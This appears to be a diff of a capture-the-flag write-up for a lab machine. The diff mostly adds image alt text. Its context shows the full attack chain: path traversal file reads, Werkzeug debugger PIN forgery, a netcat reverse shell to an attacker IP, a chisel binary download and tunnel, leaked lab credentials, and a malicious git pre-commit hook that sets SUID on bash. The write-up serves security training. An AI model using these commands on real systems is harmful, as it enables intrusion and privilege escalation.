@@ -2,7 +2,7 @@
 
 **IP Address:** `10.10.11.164`  
 **OS:** Ubuntu (Bionic)  
-**Difficulty:** Medium  
+**Difficulty:** Easy  
 **Tags:** #Web, #Flask, #Docker, #Werkzeug, #LFI, #Git, #PortForwarding, #PrivilegeEscalation
 
 ---
@@ -41,7 +41,7 @@ Privilege escalation is performed by abusing **Git hooks** executed as root via 
 ping -c 1 10.10.11.164
 ```
 
-![](screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 ### 1.2 Port Scanning
 
@@ -56,7 +56,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.164 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![](screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -64,7 +64,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![](screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ### 1.3 Targeted Scan
 
@@ -76,13 +76,7 @@ nmap -p22,80 -sC -sV 10.10.11.164 -oN targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-Let's check the result:
-
-``` bash
-cat targeted -l java
-```
-
-![](screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -104,34 +98,34 @@ We can sheck the OpenSSH version in Launchpad:
 whatweb http://10.10.11.164
 ```
 
-![](screenshots/whatweb.png)
+![whatweb](screenshots/whatweb.png)
 
 The service appears to be running on **Python Flask**.
 
 ### 2.2 Exploring the Website
 
-![](screenshots/web.png)
+![web](screenshots/web.png)
 
 
 - `Download` → retrieves a file `source.zip`  
 
-![](screenshots/source_downloaded.png)
+![source_downloaded](screenshots/source_downloaded.png)
 
 - `Take me there!` → redirects to `/uplcloud` (file upload interface)  
   
-![](screenshots/web_upcloud.png)
+![web_upcloud](screenshots/web_upcloud.png)
 
 Testing file upload with `test.txt`:
 
-![](screenshots/web_upcloud_test.png)
+![web_upcloud_test](screenshots/web_upcloud_test.png)
 
 Tap in `file`:
 
-![](screenshots/web_test.png)
+![web_test](screenshots/web_test.png)
 
 Attempting **SSTI** with `{{7*7}}` fails:
 
-![](screenshots/web_7_ssti.png)
+![web_7_ssti](screenshots/web_7_ssti.png)
 
 ### 2.3 Fuzzing for Hidden Directories
 
@@ -141,17 +135,17 @@ Let's use WFUZZ to find sub-domains:
 wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.164/FUZZ
 ```
 
-![](screenshots/wfuzz.png)
+![wfuzz](screenshots/wfuzz.png)
 
 Discovered **/console** endpoint, a Werkzeug debugger console:
 
-![](screenshots/web_console.png)
+![web_console](screenshots/web_console.png)
 
 ### 2.4 Local File Inclusion via Upload Bypass
 
 Analysis of `utils.py` from **source.zip** file downloaded shows path sanitization in `./`: 
 
-![](screenshots/source_utils.png)
+![source_utils](screenshots/source_utils.png)
 
 But bypassable with `..//`.
 
@@ -159,7 +153,7 @@ But bypassable with `..//`.
 curl http://10.10.11.164/uploads/..//etc/passwd --path-as-is
 ```
 
-![](screenshots/curl_etc_passwd.png)
+![curl_etc_passwd](screenshots/curl_etc_passwd.png)
 
 ---
 ## 3. Exploitation
@@ -170,32 +164,32 @@ Following HackTricks methodology, required values were extracted:
 
 - Username: `root`  
 - Flask app path discovered via BurpSuite:  
-![](screenshots/burpsuite_path.png)
+![burpsuite_path](screenshots/burpsuite_path.png)
 - MAC address → converted to decimal:  
   ```bash
   curl http://10.10.11.164/uploads/..//sys/class/net/eth0/address --path-as-is
   ```
-![](screenshots/curl_mac_address.png)
-![](screenshots/python_mac_decimal.png)
+![curl_mac_address](screenshots/curl_mac_address.png)
+![python_mac_decimal](screenshots/python_mac_decimal.png)
 - Boot ID:  
   ```bash
   curl http://10.10.11.164/uploads/..//proc/sys/kernel/random/boot_id --path-as-is --ignore-content-length
   ```
-![](screenshots/curl_boot_id.png)
+![curl_boot_id](screenshots/curl_boot_id.png)
 - Cgroup:  
   ```bash
   curl http://10.10.11.164/uploads/..//proc/self/cgroup --path-as-is --ignore-content-length
   ```
-![](screenshots/curl_cgroup.png)
+![curl_cgroup](screenshots/curl_cgroup.png)
 
 PIN generated successfully:
 
-![](screenshots/generate_pin_executed.png)
+![generate_pin_executed](screenshots/generate_pin_executed.png)
 
 Access granted to console:
 
-![](screenshots/web_console_login.png)
-![](screenshots/web_console_whoami.png)
+![web_console_login](screenshots/web_console_login.png)
+![web_console_whoami](screenshots/web_console_whoami.png)
 
 ### 3.2 Remote Shell
 
@@ -203,11 +197,11 @@ Access granted to console:
 os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 443").read().strip()
 ```
 
-![](screenshots/web_console_send_bash.png)
+![web_console_send_bash](screenshots/web_console_send_bash.png)
 
 Gained shell inside **Docker container**:
 
-![](screenshots/container.png)
+![container](screenshots/container.png)
 
 ---
 ## 4. Foothold
@@ -223,10 +217,10 @@ git log dev
 git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
 ```
 
-![](screenshots/git_log_public.png)
-![](screenshots/git_branch.png)
-![](screenshots/git_log_dev.png)
-![](screenshots/git_show_credentials.png)
+![git_log_public](screenshots/git_log_public.png)
+![git_branch](screenshots/git_branch.png)
+![git_log_dev](screenshots/git_log_dev.png)
+![git_show_credentials](screenshots/git_show_credentials.png)
 
 Credentials found:  
 `dev01:Soulless_Developer#2022`
@@ -237,7 +231,7 @@ Credentials found:
 nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.164
 ```
 
-![](screenshots/nmap_filtered_ports.png)
+![nmap_filtered_ports](screenshots/nmap_filtered_ports.png)
 
 Discovered **port 3000**. From container:
 
@@ -247,8 +241,8 @@ ping -c 1 172.17.0.1
 wget http://172.17.0.1:3000/ -qO-
 ```
 
-![](screenshots/container_ip.png)
-![](screenshots/gitea.png)
+![container_ip](screenshots/container_ip.png)
+![gitea](screenshots/gitea.png)
 
 ### 4.3 Remote Port Forwarding with Chisel
 
@@ -259,7 +253,7 @@ python -m http.server
 wget http://10.10.14.10:8000/chisel
 ```
 
-![](screenshots/chisel.png)
+![chisel](screenshots/chisel.png)
 
 - Attacker as server:
   ```bash
@@ -270,23 +264,23 @@ wget http://10.10.14.10:8000/chisel
   ./chisel client 10.10.14.10:1234 R:3000:172.17.0.1:3000
   ```
 
-![](screenshots/chisel_execute.png)
+![chisel_execute](screenshots/chisel_execute.png)
 
 Now accessible locally:
 
-![](screenshots/gitea_localhost.png)
+![gitea_localhost](screenshots/gitea_localhost.png)
 
 Login with discovered credentials:
 
-![](screenshots/gitea_login.png)
+![gitea_login](screenshots/gitea_login.png)
 
 SSH private key found in repo:
 
-![](screenshots/gitea_id_rsa.png)
+![gitea_id_rsa](screenshots/gitea_id_rsa.png)
 
 SSH access as `dev01`:
 
-![](screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ✅ User flag obtained
 
@@ -301,8 +295,8 @@ chmod +x pspy64
 ./pspy64
 ```
 
-![](screenshots/git_sync_pspy.png)
-![](screenshots/git_scan_code.png)
+![git_sync_pspy](screenshots/git_sync_pspy.png)
+![git_scan_code](screenshots/git_scan_code.png)
 
 A cron-executed script performs `git commit` as **root**.
 
@@ -310,7 +304,7 @@ A cron-executed script performs `git commit` as **root**.
 
 Inspecting hooks:
 
-![](screenshots/git_hooks.png)
+![git_hooks](screenshots/git_hooks.png)
 
 Create malicious pre-commit hook:
 
@@ -319,7 +313,7 @@ echo 'chmod u+s /bin/bash' > ~/.git/hooks/pre-commit
 chmod +x ~/.git/hooks/pre-commit 
 ```
 
-![](screenshots/git_hooks_add_bash.png)
+![git_hooks_add_bash](screenshots/git_hooks_add_bash.png)
 
 After cron executes:
 
@@ -327,7 +321,7 @@ After cron executes:
 bash -p
 ```
 
-![](screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 🏁 Root flag obtained
 
